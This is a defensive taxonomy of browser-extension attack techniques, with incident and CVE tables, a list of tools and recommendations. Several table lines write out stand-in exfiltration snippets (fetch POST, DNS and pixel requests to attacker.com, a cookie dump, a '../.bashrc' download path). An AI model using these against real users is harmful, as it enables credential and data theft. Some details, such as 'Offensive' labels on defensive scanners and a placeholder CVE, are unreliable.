# Browser Extension Security Mutation/Variation Taxonomy

---

## Classification Structure

Browser extensions operate in a unique security boundary between web applications and the browser platform itself, with elevated privileges that enable both legitimate functionality and sophisticated attacks. This taxonomy organizes extension security vulnerabilities along three fundamental axes:

**Axis 1 (Primary Structure)** categorizes attacks by the **architectural component being exploited** — permission models, content scripts, extension APIs, communication channels, lifecycle processes, data channels, user interfaces, and native integrations. Each category represents a distinct attack surface within the extension architecture.

**Axis 2 (Cross-Cutting Mechanism)** identifies the **security property being violated** to enable the attack. These discrepancy types recur across multiple structural targets and explain *why* a particular mutation succeeds despite existing defenses.

**Axis 3 (Impact Scenario)** maps techniques to **real-world exploitation contexts** and weaponization patterns, connecting structural vulnerabilities to actual user harm.

### Discrepancy Types (Axis 2)

These cross-cutting mechanisms appear throughout the taxonomy:

| Discrepancy Type | Definition | Key Characteristic |
|-----------------|------------|-------------------|
| **Permission Bypass** | Achieving functionality without requesting required permissions | Exploits gaps between permission model and actual API enforcement |
| **Isolation Break** | Violating sandbox boundaries between extension contexts | Crosses security domains (web page ↔ content script ↔ background) |
| **Privilege Escalation** | Gaining higher privileges than legitimately granted | Leverages message authentication failures or API design flaws |
| **Review Evasion** | Bypassing store security review processes | Uses obfuscation, delayed activation, or post-publication updates |
| **Trust Hijacking** | Exploiting user/system trust in legitimate extensions | Supply chain attacks, ownership transfers, update abuse |
| **Authentication Bypass** | Circumventing extension message authentication | Allows web pages or malicious extensions to invoke privileged operations |

### Fundamental Extension Architecture

Browser extensions (Chrome, Firefox, Edge, Safari) consist of three primary execution contexts:

1. **Background Context** (Service Worker in MV3): Persistent privileged context with full extension API access
2. **Content Scripts**: Injected into web pages, subject to page CSP but with extension API access
3. **Web-Accessible Resources**: Pages/scripts that can be loaded by web content

Security boundaries exist between these contexts and between extensions and web pages. Most attacks exploit mismatches in how these boundaries are enforced across different components, browsers, or manifest versions.

---

## §1. Permission Model Exploitation

The extension permission system mediates access to sensitive APIs. Attacks in this category circumvent permission requirements or abuse broad permissions to achieve unauthorized functionality.

### §1-1. Minimal Permission Attacks

Extensions can perform sophisticated attacks using only basic permissions that appear innocuous during installation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **activeTab-Based Exfiltration** | Using `activeTab` permission (granted on user click) to read page content and exfiltrate via fetch | Requires only `activeTab`, not `<all_urls>` — users perceive as low-risk |
| **Storage-Based Keylogging** | Capturing keystrokes via content script and storing in `chrome.storage` without network permissions | Bypasses network-permission requirements; exfiltration happens on next sync |
| **History Profiling** | Building user profiles via `history` permission without declaring privacy implications | Chrome permission warnings don't adequately convey profiling risk |

Research demonstrates that extensions need only `activeTab`, `scripting`, and `storage` permissions to execute credential theft, session hijacking, and behavioral tracking — permissions commonly granted without scrutiny.

### §1-2. Permission Escalation via Updates

Extensions retain granted permissions across updates, enabling privilege escalation through benign-to-malicious transitions.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Sleeper Extension Pattern** | Publishing benign extension, building install base, then adding malicious permissions via update | Users rarely review update permission requests; auto-update enabled by default |
| **Dynamic Permission Request** | Requesting broad permissions only after initial approval via `chrome.permissions.request()` | Appears as in-app feature upgrade; users often approve without scrutiny |
| **Secret Ownership Transfer** | New owner inherits all previously granted permissions without re-review | Chrome Web Store allows ownership transfers with minimal user notification (Trust Hijacking) |

The **Cyberhaven breach (Dec 2024)** exemplifies this: attackers compromised developer OAuth tokens, pushed malicious update retaining all permissions, affecting 400,000+ users before detection.

### §1-3. Manifest V3 Permission Bypasses

Manifest V3 was designed to restrict permissions, but several bypass techniques circumvent these improvements.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Declarative Net Request Bypass** | Removing CSP headers via `declarativeNetRequest` to enable inline script injection | MV3 allows header modification; 29.8% of malicious MV2 extensions remain functional after MV3 conversion |
| **Scripting API Abuse** | Using `chrome.scripting.executeScript()` to inject arbitrary code without traditional `webRequest` | Replaces removed `webRequest` capabilities; same attack surface, different API |
| **Service Worker Persistence** | Maintaining attack state in Service Worker despite ephemeral design | Attackers use alarms, message listeners, and storage to persist across wake cycles |

While MV3 removed 87.8% of APIs related to malicious behavior, core attack primitives remain accessible through alternative APIs.

---

## §2. Content Script Isolation Attacks

Content scripts inject into web page contexts but should remain isolated from page JavaScript. Attacks here break this isolation boundary to achieve cross-context code execution.

### §2-1. Content Script XSS

Content scripts can introduce XSS vulnerabilities into otherwise secure web pages through unsafe DOM manipulation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Reflected Extension Input** | Extension reflects user/page input back into DOM without sanitization | Content scripts not subject to page CSP; can use `innerHTML`, `eval()` |
| **Unsafe postMessage Handling** | Content script receives postMessage from page without origin validation, uses data in DOM | Any webpage can send messages to content script; creates universal XSS |
| **jQuery $(location.hash) Pattern** | Using jQuery selectors with attacker-controlled input (URL fragments, query params) | Common in extensions porting web code; bypasses page XSS protections |

**XSS ChEF** framework demonstrates exploitation: XSS in content script escalates to background page, gaining full extension privileges including `cookies`, `tabs`, and `storage` API access.

### §2-2. World Isolation Bypasses

Modern browsers implement "isolated worlds" separating content script and page JavaScript. Several techniques bypass this protection.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Shared DOM Mutation** | Page script and content script both manipulate same DOM elements, creating race conditions | MutationObserver can't distinguish mutation source; enables data smuggling |
| **Event Handler Injection** | Content script creates DOM elements with event handlers; page script triggers events | Event handlers execute in content script context with extension privileges |
| **Prototype Pollution Bridge** | Polluting shared prototypes (Object, Array) to pass data between worlds | Both contexts share built-in prototypes in some browser versions |

### §2-3. Content Script Privilege Leakage

Content scripts with insufficient authentication leak extension privileges to web pages.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unauthenticated Message Handlers** | Content script listens for `window.postMessage` without validating `event.origin` | 59 vulnerabilities found in 40 extensions; enables UXSS, credential theft (USENIX Security 2023) |
| **Exposed Extension APIs** | Content script exposes proxy functions to page via window object (e.g., `window.myExtension.fetch()`) | Bypasses same-origin policy; enables cross-site data theft |
| **DOM-Based Extension Clickjacking** | Malicious page overlays transparent extension UI, tricking users into triggering privileged actions | Affects password managers, crypto wallets; enables credential export |

---

## §3. Extension API Abuse

Browser vendors expose powerful APIs to extensions. Attacks here exploit API design flaws, insufficient access controls, or dangerous combinations of permitted APIs.

### §3-1. Cookie and Session Theft

Extensions with `cookies` permission can extract authentication tokens across all domains.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Universal Cookie Exfiltration** | `chrome.cookies.getAll({})` retrieves all browser cookies; exfiltrated via fetch | Requires only `cookies` + `<all_urls>` permissions |
| **Session Hijacking via Sync** | Storing stolen cookies in `chrome.storage.sync` for retrieval from attacker-controlled device | Chrome Sync automatically propagates attack data; no network traffic detected locally |
| **OAuth Token Interception** | Extracting OAuth tokens from cookies/localStorage for Google, Microsoft, Slack, etc. | Cyberhaven attack (Dec 2024) exfiltrated OAuth tokens, enabling account takeover |

### §3-2. Surveillance APIs

Several APIs enable persistent user surveillance without clear permission warnings.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Persistent Keylogging** | Content script adds event listeners for `keydown`/`keyup` across all pages | No explicit "keylogging" permission exists; covered by `<all_urls>` |
| **Screenshot Exfiltration** | `chrome.tabs.captureVisibleTab()` captures visible tab content at intervals | Requires `activeTab` or `<all_urls>`; no runtime indicator to user |
| **Camera/Microphone Access** | Calling `navigator.mediaDevices.getUserMedia()` from background or extension page | Browser prompts once; permission persists; no ongoing indicator |
| **Geolocation Tracking** | `navigator.geolocation.watchPosition()` provides continuous location updates | Permission prompt similar to websites; users don't expect continuous tracking |

### §3-3. History and Browsing Data APIs

These APIs enable detailed user profiling beyond typical web tracking.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Complete Browsing History** | `chrome.history.search({text: '', maxResults: 999999})` retrieves full history | 287 malicious extensions (2024) sold browsing history to data brokers |
| **Bookmark Enumeration** | `chrome.bookmarks.getTree()` reveals organizational structure and sensitive URLs | Exposes internal URLs, admin panels, personal interests |
| **Tab URL Monitoring** | `chrome.tabs.onUpdated` listener captures all URL navigations in real-time | Enables real-time tracking across private browsing (in some configurations) |

### §3-4. Native Messaging API Exploitation

`nativeMessaging` permission allows extensions to communicate with native applications, effectively bypassing browser sandbox.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Arbitrary File Read/Write** | Extension communicates with native binary to read/modify filesystem | Requires native app installation; often bundled via installer |
| **Command Execution** | Native binary executes shell commands on behalf of extension | Escalates browser-level access to OS-level RCE |
| **Malware Installation** | Extension triggers native binary to download and execute additional payloads | Bypasses browser download warnings; appears as extension behavior |

---

## §4. Extension Communication Channel Attacks

Extensions communicate via multiple channels: extension messaging, postMessage, shared DOM, and external messaging. Attacks exploit insufficient authentication or protocol confusion.

### §4-1. Cross-Extension Attacks

Extensions can send messages to other installed extensions if extension IDs are known or enumerable.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Extension ID Enumeration** | Probing web-accessible resources to discover installed extensions | Many extensions expose predictable paths (e.g., `chrome-extension://<id>/icon.png`) |
| **Unauthenticated External Messages** | Malicious extension sends `chrome.runtime.sendMessage(victimExtensionId, payload)` | Victim extension doesn't validate `sender.id` or `sender.url`; 40 extensions vulnerable (USENIX 2023) |
| **Polymorphic Extension Cloning** | Malicious extension disables target extension, replaces UI with pixel-perfect replica | Affects all Chromium browsers; users interact with malicious clone believing it's legitimate (March 2025) |

### §4-2. postMessage Exploitation

Extensions often use `window.postMessage()` for communication between contexts; improper validation enables injection attacks.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Origin Validation Bypass** | Content script checks `event.origin` against incomplete allowlist (e.g., `endsWith('.example.com')`) | Attacker registers `evil.example.com` or uses `data:` URL injection |
| **Message Type Confusion** | Extension expects specific message format but doesn't validate structure | Attacker sends unexpected data types causing logic errors or injection |
| **TOCTOU in Message Handling** | Checking message properties then using cached reference; attacker mutates object | JavaScript object references allow mutation between check and use |

### §4-3. Shared State Attacks

Multiple extensions or contexts sharing state creates race conditions and data leakage.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Storage Collision** | Multiple extensions use same `localStorage` keys on shared domains | Extensions injecting into same page can read/modify each other's storage |
| **Cache Poisoning** | Malicious extension populates browser cache with crafted responses | Other extensions or pages retrieve poisoned cached content |
| **Clipboard Hijacking** | Extension monitors `navigator.clipboard` API, replacing copied content | Affects password managers, crypto wallets; enables credential/key theft |

---

## §5. Extension Lifecycle Manipulation

Attacks targeting installation, review, update, and distribution processes to introduce malicious extensions into stores or user browsers.

### §5-1. Store Review Evasion

Extensions use various techniques to bypass automated and manual security reviews.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Code Obfuscation** | JavaScript obfuscation, minification, dead code insertion to hide malicious logic | Firefox Add-ons Store more susceptible than Chrome Web Store; 70%+ of blocked extensions use obfuscation |
| **Delayed Activation** | Malicious code activates only after time delay or specific trigger event | Bypasses dynamic analysis with short observation windows |
| **Environment Detection** | Detecting review sandboxes via timing, network, or API availability and disabling attacks | Research sandboxes lack realistic user interaction patterns |
| **Remote Configuration** | Loading attack configuration from remote server post-publication | Extension code appears benign; server controls targeting and payloads |

**AiFrame campaign (2025)** used hidden full-screen iframe architecture, appearing benign during initial review, then loading remote attack payloads affecting 900,000+ users.

### §5-2. Supply Chain Attacks

Compromising developers, build processes, or distribution infrastructure to inject malicious code into legitimate extensions.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Developer Account Takeover** | Phishing developers for Chrome Web Store OAuth credentials | Spearphishing campaign (Nov-Dec 2024) compromised 30+ developer accounts via fake policy warning emails |
| **OAuth App Impersonation** | Malicious OAuth app requests Chrome Web Store publishing permissions | Users approve thinking it's legitimate Google service; grants full upload rights |
| **Dependency Poisoning** | Injecting malicious code into npm packages used by extension build process | Extensions using vulnerable dependencies inherit malicious code |
| **Ownership Transfer Exploitation** | Purchasing legitimate extensions from developers, retaining existing install base | Trust Wallet compromise (Dec 2024): leaked API key led to $7M cryptocurrency theft |

**TamperedChef campaign (Feb 2025)**: 16 compromised extensions affecting 3.2M+ users; attackers exfiltrated ChatGPT and Facebook Business credentials.

### §5-3. Update Mechanism Abuse

Extensions auto-update by default; attackers exploit this for post-installation compromise.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Benign-to-Malicious Update** | Publishing benign extension v1.0, then malicious v2.0 after building install base | Users rarely review update permissions; 72-hour review delay provides attack window |
| **Gradual Permission Escalation** | Each update requests one additional permission; cumulative effect is broad access | Small incremental requests avoid suspicion; eventually achieve full access |
| **Update Server Compromise** | Self-hosted update servers (Firefox) compromised to serve malicious updates | Firefox allows `update_url` in manifest; bypass store review entirely |

---

## §6. Data Exfiltration Mechanisms

Once an extension gains access to sensitive data, it must exfiltrate it without detection. This category covers covert channels and evasion techniques.

### §6-1. Network-Based Exfiltration

Direct transmission of stolen data to attacker infrastructure.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Fetch API Exfiltration** | `fetch('https://attacker.com', {method: 'POST', body: stolenData})` from background context | MV3 extensions can make arbitrary network requests without `webRequest` permission |
| **WebSocket Tunneling** | Establishing WebSocket connection for real-time data streaming | Bypasses request-based monitoring; persistent connection less detectable |
| **DNS Exfiltration** | Encoding stolen data in DNS queries (e.g., `<data>.attacker.com`) | Evades HTTP-focused monitoring; often allowed through firewalls |
| **Pixel Tracking** | Loading images with stolen data in URL parameters (`<img src="https://attacker.com/t.gif?d=<data>">`) | Appears as legitimate resource loading; common in ad/analytics extensions |

### §6-2. Storage-Based Exfiltration

Storing stolen data in synced storage for retrieval from attacker-controlled devices.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Chrome Sync Abuse** | Storing data in `chrome.storage.sync` automatically propagates to attacker's browser | No network traffic from victim; sync happens via Google infrastructure |
| **Bookmark Smuggling** | Encoding stolen data in bookmark URLs or titles; syncs automatically | Bookmark sync enabled by default; data persists even if extension removed |
| **Cloud Storage Upload** | Uploading data to Google Drive, Dropbox via OAuth tokens extracted from cookies | Appears as legitimate user activity; bypasses DLP focused on attacker domains |

### §6-3. Stealth Extension Exfiltration (SEE)

Techniques enabling data exfiltration without explicit permissions by exploiting permission mismanagement.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Implicit Grant Exploitation** | Extension embeds image/script pointing to attacker domain; browser sends cookies automatically | No `host_permissions` required; browser's cookie policy sends credentials with subresource requests |
| **Redirect-Based Exfiltration** | Extension navigates hidden iframe to attacker domain with data in URL fragment | Fragment not sent to server in HTTP; attacker's page reads via JavaScript |
| **Service Worker Proxy** | Extension's service worker intercepts fetch events, forwards to attacker | Bypasses origin-based monitoring; appears as internal extension activity |

**SEE attacks** (ACM SAC 2025) analyzed 57,831 extensions; vulnerabilities potentially affect 351 million users.

---

## §7. User Interface Deception

Attacks manipulating visual presentation to deceive users into granting permissions, revealing credentials, or triggering privileged actions.

### §7-1. Visual Spoofing

Creating fake UI elements resembling legitimate browser or extension interfaces.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Fake Permission Prompt** | Extension creates HTML overlay mimicking Chrome permission dialog | Users trained to click "Allow"; real permission already granted, fake prompt extracts credentials |
| **Popup Replacement** | Malicious extension replaces legitimate extension's popup UI | Polymorphic attack (March 2025) creates pixel-perfect clones; user unknowingly interacts with malicious version |
| **Address Bar Spoofing** | Extension modifies page content to display fake address bar | Users verify URL in fake bar while actual URL is malicious |

### §7-2. Clickjacking

Overlaying transparent or disguised UI elements to capture clicks intended for legitimate targets.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **DOM-Based Extension Clickjacking** | Malicious page overlays transparent iframe containing extension UI (password manager, wallet) | User believes they're clicking page element; actually triggering extension action like "Export Passwords" |
| **Notification Hijacking** | Displaying fake browser notifications prompting security actions | `Notification` API allows extensions to create system-level notifications; users can't distinguish from browser warnings |
| **Tab-Under Attack** | Opening malicious tab hidden behind current tab; triggers action when user switches | Extension can manipulate tab z-order, focus, and visibility |

### §7-3. Social Engineering

Leveraging extension context to enhance credibility of phishing or scam content.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **In-Browser Phishing** | Injecting phishing forms into legitimate pages (e.g., fake login overlays on banking sites) | Content script can manipulate any page DOM; appears more trustworthy than external phishing site |
| **Fake Security Warnings** | Displaying fabricated malware/security warnings to coerce actions | Users trust warnings appearing "inside" browser more than web popups |
| **Extension Impersonation** | Using name/icon similar to popular security extensions (AdBlock, password managers) | Users install thinking it's legitimate; permissions appear reasonable for claimed functionality |

---

## §8. Native Integration Exploitation

Attacks leveraging browser-OS integration points to escalate beyond browser sandbox.

### §8-1. Native Messaging Exploitation

`nativeMessaging` permission allows communication with native binaries; creates bridge to OS-level access.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Filesystem Access** | Native binary provides read/write access to arbitrary files | Extension requests file paths; native component bypasses browser sandbox |
| **Process Execution** | Native binary spawns processes on behalf of extension | Enables arbitrary command execution; full RCE from browser extension |
| **Hardware Access** | Native binary accesses webcam, microphone, USB devices without browser mediation | Bypasses browser permission model; no runtime indicators |

### §8-2. Protocol Handler Abuse

Extensions can register custom protocol handlers; enables URI-based exploitation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Custom Scheme Injection** | Registering handler for `ext://` or similar; malicious pages trigger via links | Clicking `<a href="ext://action?cmd=steal">` invokes extension without user awareness |
| **File:// Protocol Access** | Extensions with `file://` permission read local files when pages link to `file://` URLs | Enables arbitrary local file read if combined with path traversal |
| **Intent Redirection** | Registering handlers for `intent://` (Android) or `x-apple-data-detectors://` (iOS) | Mobile browsers route actions through extension; enables phishing/data theft |

### §8-3. Download API Exploitation

Extensions can programmatically download files, bypassing standard browser warnings.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Silent Download** | `chrome.downloads.download({url, filename})` downloads without user confirmation | Enables silent malware download; bypasses safe browsing checks in some cases |
| **Download Filename Spoofing** | Setting `filename` to exploit OS file handling (e.g., `.exe` disguised as `.pdf.exe`) | Windows hides known extensions; users execute believing it's document |
| **Path Traversal Download** | Specifying `filename: '../../../../.bashrc'` to write outside download directory | Some browsers insufficiently sanitize download paths; enables config file overwrite |

---

## Attack Scenario Mapping (Axis 3)

This table maps structural vulnerability categories (Axis 1) to real-world exploitation contexts (Axis 3).

| Scenario | Architectural Context | Primary Mutation Categories | Notable Incidents |
|----------|----------------------|----------------------------|-------------------|
| **Credential Theft** | Extensions targeting authentication data (passwords, tokens, cookies) | §1 + §3-1 + §6 | Cyberhaven (400K users), H-Chat Assistant (10K+ API keys) |
| **Data Exfiltration** | Harvesting sensitive page content, form data, emails | §2 + §3-2 + §6 | 287 extensions sold browsing history (2024), Arcanum study (millions affected) |
| **Supply Chain Compromise** | Developer account takeover, ownership transfer, update hijacking | §5-2 + §5-3 | TamperedChef (16 extensions, 3.2M users), Trust Wallet ($7M theft) |
| **Surveillance** | Persistent monitoring via keylogging, screenshots, camera, location | §3-2 + §6 | StealthSpy, DataPhisher (2024 campaigns) |
| **Content Manipulation** | Ad injection, page redirection, scam overlays | §2 + §7 | Rilide malware (CSP bypass, transaction manipulation) |
| **Request Forgery** | Unauthorized transactions, form submissions, API calls | §3 + §4 | Banking trojans targeting crypto wallets, financial sites |
| **Cross-Extension Attack** | Targeting other installed extensions to steal data or escalate privileges | §4-1 + §2-3 | Polymorphic cloning attack (March 2025) |
| **Cryptocurrency Theft** | Extracting private keys, seed phrases; manipulating transactions | §3-1 + §7-2 + §8 | Trust Wallet ($7M), Backpack vulnerabilities |

---

## CVE / Bounty Mapping (2024-2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §5-2 + §3-1 + §6-2 | Cyberhaven Supply Chain Attack (Dec 2024) | 400,000 users affected; OAuth token theft; ChatGPT, Slack, Jira credentials exfiltrated |
| §5-2 + §8 | Trust Wallet CVE (Dec 2024) | **$7,000,000** cryptocurrency theft via compromised update v2.68 |
| §5-2 + §3-1 | TamperedChef Campaign (Feb 2025) | 3.2M users; 16 extensions compromised; Facebook Business + ChatGPT credential harvesting |
| §1-3 + §7 | CVE-2024-21388 (Microsoft Edge) | CVSS 6.5; Silent extension installation without user consent |
| §2-1 + §3 | Chrome DevTools Extension (CVE-2024-*) | Arbitrary code execution via malicious extension in Chrome <126.0.6478.54 |
| §7-1 + §4-1 | Polymorphic Extension Cloning (March 2025) | Affects all Chromium browsers; credential theft via UI impersonation |
| §6-3 + §1-1 | Stealth Extension Exfiltration (SEE) | 57,831 extensions analyzed; 351M users potentially affected; unauthorized HTTP requests without permissions |
| §7-3 + §6 | AiFrame Campaign (2025) | 900,000+ users; 30 extensions masquerading as AI assistants; full-screen iframe remote control |
| §3-2 + §6 | H-Chat Assistant (Jan 2025) | 10,000+ users; 459 unique OpenAI API keys exfiltrated to Telegram |
| §6-1 + §3-3 | 287 Malicious Extensions (2024) | Browsing history sold to data brokers; millions of users profiled |
| §3-1 + §4 | Okta Browser Plugin XSS | CVE-2024-0981; Reflected XSS enabling session hijacking |
| §2-3 + §4 | USENIX Security 2023 Study | 59 vulnerabilities in 40 extensions; 10M+ users; UXSS, password/crypto theft via unauthenticated messages |

---

## Detection & Defense Tools

| Tool | Type | Target Scope | Core Technique |
|------|------|-------------|----------------|
| **CRXcavator** | Offensive | Chrome/Firefox/Edge | Automated risk scoring; scans entire stores every 3 hours; permission analysis |
| **ExtAnalysis** | Offensive | Chrome/Firefox/Brave | Static analysis framework; vulnerability detection; code review automation |
| **CRXPlorer** | Offensive | Chrome | Extension scanner for hidden permissions, suspicious code, security risks |
| **BrowserTotal** | Offensive | Chrome/Edge/Firefox | Comprehensive platform for extension analysis, URL scanning, vulnerability detection |
| **Arcanum** | Research | Chrome | Dynamic taint tracking; monitors data flow from pages through extensions |
| **XSS ChEF** | Offensive | Chrome | Extension XSS exploitation framework; privilege escalation testing |
| **Microsoft Defender Vulnerability Management** | Defensive | Enterprise | Inventory and risk assessment of installed extensions; policy enforcement |
| **Spin.AI SpinMonitor** | Defensive | Enterprise | Real-time extension risk detection; 400K+ extension database; automated alerts |
| **LayerX Extension Security** | Defensive | Enterprise | Runtime monitoring; malicious behavior detection; policy enforcement based on T&T Matrix |
| **Seraphic Browser Security** | Defensive | Enterprise | Real-time webpage integrity monitoring; DOM manipulation detection; API tampering prevention |
| **FistBump** | Research | Chrome/Firefox | Enforces process isolation between content scripts and pages; prevents privilege escalation (USENIX 2023) |

---

## Summary: Core Principles

Browser extensions occupy a **unique threat landscape** at the intersection of web applications and OS-level privileges. Unlike traditional web attacks constrained by same-origin policy, or malware requiring OS-level installation, extensions combine *user-granted permissions* with *persistent background execution* and *cross-site access* — creating an exceptionally powerful attack surface.

The fundamental vulnerability lies in **permission model inadequacy**: extensions require broad permissions for legitimate functionality (e.g., password managers need `<all_urls>` + `cookies`), but these same permissions enable comprehensive surveillance and data theft. The browser cannot distinguish between legitimate and malicious use of authorized APIs. This is compounded by **user inability to assess risk** — permission warnings like "read and change all your data" are simultaneously accurate and meaningless, as users cannot differentiate a password manager's necessary access from a malicious extension's surveillance capabilities.

**Supply chain attacks** have emerged as the dominant threat vector in 2024-2025 because they bypass the hardest problem in extension malware deployment: achieving widespread installation. By compromising developer accounts or purchasing legitimate extensions, attackers inherit existing trust and install base. The **TamperedChef** and **Cyberhaven** campaigns demonstrate that even security-conscious organizations' extensions can be weaponized via developer credential phishing.

**Incremental defenses fail** because they address symptoms rather than architectural flaws. Manifest V3 restrictions, store review improvements, and obfuscation bans reduce *obvious* malicious extensions but don't prevent determined attackers from achieving the same objectives through alternative APIs, delayed activation, or supply chain compromise. The research showing 29.8% of malicious extensions remain functional post-MV3 conversion confirms this.

The **structural solution** requires three fundamental shifts:

1. **Permission Granularity**: Moving from binary permissions (`<all_urls>` vs. nothing) to per-domain, per-action, time-limited grants. Password managers should access `login.bank.com` only when user clicks the extension, not persistently monitor all tabs.

2. **Post-Publication Integrity**: Continuous behavioral monitoring with anomaly detection, not just pre-publication review. Extensions making network requests to new domains, accessing new APIs, or exhibiting statistical anomalies in data access patterns should trigger automated suspension and human review.

3. **Architectural Isolation**: Adopting browser-level isolation (similar to **FistBump**) that enforces privilege separation by design. Content scripts should never invoke privileged APIs without cryptographic authentication of the requesting context, preventing the entire class of cross-context attacks (§2, §4).

Until these structural changes occur, browser extensions will remain the **highest-privilege, least-monitored attack surface** in modern computing — a credential theft and surveillance platform granted willing access by users who lack alternatives.

---

*This document was created for defensive security research and vulnerability understanding purposes.*

## References

- [Google Chrome Extensions Vulnerabilities](https://www.cmu.edu/iso/news/2025/google-vulnerabilities.html) - Carnegie Mellon University
- [A Study on Malicious Browser Extensions in 2025](https://arxiv.org/html/2503.04292) - arXiv
- [Microsoft Edge Bug Could Have Allowed Attackers to Silently Install Malicious Extensions](https://thehackernews.com/2024/03/microsoft-edge-bug-could-have-allowed.html) - The Hacker News
- [Cyberhaven Supply Chain Attack: Exploiting Browser Extensions](https://www.darktrace.com/blog/cyberhaven-supply-chain-attack-exploiting-browser-extensions) - Darktrace
- [36 Chrome Extensions Compromised in Supply Chain Attack](https://www.bankinfosecurity.com/36-chrome-extensions-compromised-in-supply-chain-attack-a-27207) - Bank Info Security
- [Researchers Expose New Polymorphic Attack That Clones Browser Extensions to Steal Credentials](https://thehackernews.com/2025/03/researchers-expose-new-polymorphic.html) - The Hacker News
- [Arcanum: Detecting and Evaluating the Privacy Risks of Browser Extensions on Web Pages and Web Content](https://www.usenix.org/conference/usenixsecurity24/presentation/xie-qinge) - USENIX Security 2024
- [Experimental Security Analysis of Sensitive Data Access by Browser Extensions](https://dl.acm.org/doi/10.1145/3589334.3645683) - ACM Web Conference 2024
- [Extending a Hand to Attackers: Browser Privilege Escalation Attacks via Extensions](https://www.usenix.org/conference/usenixsecurity23/presentation/kim-young-min) - USENIX Security 2023
- [Stealth Extension Exfiltration (SEE) Attacks](https://dl.acm.org/doi/10.1145/3672608.3707856) - ACM SAC 2025
- [Introducing the Tactics & Techniques Matrix for Malicious Browser Extensions](https://layerxsecurity.com/blog/introducing-the-tactics-techniques-matrix-for-malicious-browser-extensions/) - LayerX Security
- [Browser Extension Vulnerabilities - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html) - OWASP
- [Chrome extensions remain a threat even after Google's Manifest V3](https://www.techzine.eu/news/security/126153/chrome-extensions-remain-a-threat-even-after-googles-manifest-v3/) - Techzine Global
- [Trust Wallet Chrome Extension Supply Chain Attack](https://www.rescana.com/post/trust-wallet-chrome-extension-supply-chain-attack-7-million-cryptocurrency-theft-via-compromised-v) - Rescana
- [Tech Note - Malicious browser extensions impacting at least 3.2 million users](https://gitlab-com.gitlab.io/gl-security/security-tech-notes/threat-intelligence-tech-notes/malicious-browser-extensions-feb-2025/) - GitLab Security
- [Privilege escalation vulnerabilities in WebExtension APIs](https://www.mozilla.org/en-US/security/advisories/mfsa2015-148/) - Mozilla
- [CRXcavator](https://crxcavator.io/docs) - Duo Security
- [Browser-Powered Desync Attacks](https://portswigger.net/web-security/request-smuggling/browser) - PortSwigger Research
- [6 Browser-Based Attacks Security Teams Need to Prepare For Right Now](https://thehackernews.com/2025/09/6-browser-based-attacks-security-teams.html) - The Hacker News
